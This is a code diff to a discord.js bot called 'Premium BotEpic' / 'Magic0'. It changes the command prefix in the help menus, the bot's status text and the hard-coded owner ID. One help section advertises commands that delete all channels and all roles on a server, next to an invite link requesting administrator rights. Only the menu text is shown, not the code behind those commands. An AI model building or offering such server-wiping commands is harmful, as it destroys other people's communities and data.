@@ -1,6 +1,10 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
 
+// playing
+client.on('ready', () => {                           
+client.user.setGame(`♥ Premium BotEpic ♥ | use: # `,'https://www.twitch.tv/ℕ o v a Codes♥');
+  });
 
 
 // playing
@@ -16,24 +20,24 @@ client.on('message', message => {
       .setDescription(`
 🕴_____ 🖤😎 - Premium BotEpic - 😎🖤  _____🕴
 
-🖤(-nick ⟿ Change nickname all members)🖤
-🖤(-banlist ⟿⟿ Number Ban from server)🖤
-🖤(-bc ⟿⟿⟿ Brodcast all member)🖤
-🖤(-call ⟿⟿ Contact with admin)🖤
-🖤(-kv ⟿⟿⟿⟿⟿ Kick from voice)🖤
-🖤(-kick ⟿⟿⟿⟿⟿⟿ Kick member)🖤
-🖤(-ban ⟿⟿⟿⟿⟿⟿⟿ Ban member)🖤
-🖤(-role all ⟿⟿⟿⟿⟿ From All)🖤
-🖤(-role humans ⟿ From All Humans)🖤
-🖤(-role bots ⟿⟿⟿ From All Bots)🖤
-🖤(-clear ⟿⟿⟿⟿ Delete all chat)🖤
-🖤(-mvall ⟿ Move all to you voice)🖤
-🖤(-hc ⟿⟿⟿⟿⟿⟿⟿ Hide channel)🖤
-🖤(-sc ⟿⟿⟿⟿⟿⟿⟿ Show channel)🖤
-🖤(-mc ⟿⟿⟿⟿⟿⟿⟿ Mute channel)🖤
-🖤(-unmc ⟿⟿⟿⟿⟿ Unmute channel)🖤
-🖤(-mute ⟿⟿⟿⟿⟿⟿ Mute member)🖤
-🖤(-unmute ⟿⟿⟿⟿ Unmute member)🖤
+🖤($nick ⟿ Change nickname all members)🖤
+🖤($banlist ⟿⟿ Number Ban from server)🖤
+🖤($bc ⟿⟿⟿ Brodcast all member)🖤
+🖤($call ⟿⟿ Contact with admin)🖤
+🖤($kv ⟿⟿⟿⟿⟿ Kick from voice)🖤
+🖤($kick ⟿⟿⟿⟿⟿⟿ Kick member)🖤
+🖤(-$ban ⟿⟿⟿⟿⟿⟿⟿ Ban member)🖤
+🖤($role all ⟿⟿⟿⟿⟿ From All)🖤
+🖤($role humans ⟿ From All Humans)🖤
+🖤($role bots ⟿⟿⟿ From All Bots)🖤
+🖤($clear ⟿⟿⟿⟿ Delete all chat)🖤
+🖤($mvall ⟿ Move all to you voice)🖤
+🖤($hc ⟿⟿⟿⟿⟿⟿⟿ Hide channel)🖤
+🖤($sc ⟿⟿⟿⟿⟿⟿⟿ Show channel)🖤
+🖤($mc ⟿⟿⟿⟿⟿⟿⟿ Mute channel)🖤
+🖤($unmc ⟿⟿⟿⟿⟿ Unmute channel)🖤
+🖤($mute ⟿⟿⟿⟿⟿⟿ Mute member)🖤
+🖤($unmute ⟿⟿⟿⟿ Unmute member)🖤
 
 🕴_____ 🖤😎 - Permium BotEpic - 😎🖤  _____🕴
 
@@ -661,9 +665,9 @@ var prefix = "$";
           if(!message.channel.guild) return;
           var mmmmEmbed = new Discord.RichEmbed()
           .setAuthor(client.user.username)
-          .setTitle('𝔾𝔼𝕂𝕆 𝕌𝕄𝔼')
+          .setTitle('Magic0')
           .setURL(`https://discordapp.com/api/oauth2/authorize?client_id=531729259421499402&permissions=8&scope=bot`)
-           if(message.author.id !== "351366504068939777") return message.reply('**You aren\'t the bot owner.**');
+           if(message.author.id !== "352533519068823556") return message.reply('**You aren\'t the bot owner.**');
           message.channel.send(mmmmEmbed)
       }
    });
@@ -688,23 +692,23 @@ client.on('message', message => {
       .setDescription(`
 💜_____ 🖤😎 - Premium BotEpic - 😎🖤  _____💜
 
-🖤(-server ⟿⟿⟿⟿⟿ About the server)🖤
+🖤($server ⟿⟿⟿⟿⟿ About the server)🖤
 
-🖤(-allbots ⟿⟿ Nubmers bots in server)🖤
+🖤($allbots ⟿⟿ Nubmers bots in server)🖤
 
-🖤(-botin ⟿⟿⟿⟿⟿⟿ Bot Information)🖤
+🖤($botin ⟿⟿⟿⟿⟿⟿ Bot Information)🖤
 
-🖤(-report ⟿⟿⟿⟿⟿ Report a member)🖤
+🖤($report ⟿⟿⟿⟿⟿ Report a member)🖤
 
-🖤(-support ⟿⟿ Contact with the bot owner)🖤
+🖤($support ⟿⟿ Contact with the bot owner)🖤
 
-🖤(-avatar ⟿⟿⟿⟿⟿ View your avatar)🖤
+🖤($avatar ⟿⟿⟿⟿⟿ View your avatar)🖤
 
-🖤(-members ⟿⟿⟿⟿ Status of member)🖤
+🖤($members ⟿⟿⟿⟿ Status of member)🖤
 
-🖤(-say ⟿⟿⟿⟿⟿⟿ Status of member)🖤
+🖤($say ⟿⟿⟿⟿⟿⟿ Status of member)🖤
 
-🖤(-emojis ⟿⟿⟿⟿⟿ Emoji Of Server)🖤
+🖤($emojis ⟿⟿⟿⟿⟿ Emoji Of Server)🖤
 
 
 💜_____ 🖤😎 - Premium BotEpic - 😎🖤  _____💜
@@ -886,11 +890,11 @@ client.on('message', message => {
       .setDescription(`
 😈__⚠🚫⚠_ 🖤😎 - Magic0 - 😎🖤  _⚠🚫⚠__😈
 
-🖤(-dc ⟿⟿⟿ Delete all channels)🖤
+🖤($dc ⟿⟿⟿ Delete all channels)🖤
 
-🖤(-dr ⟿⟿⟿⟿ Delete all roles)🖤
+🖤($dr ⟿⟿⟿⟿ Delete all roles)🖤
 
-🖤(-inv ⟿⟿⟿⟿ Invite bot owner)🖤
+🖤($inv ⟿⟿⟿⟿ Invite bot owner)🖤
 
 
 😈__⚠🚫⚠_ 🖤😎 - Magic0 - 😎🖤  _⚠🚫⚠__😈
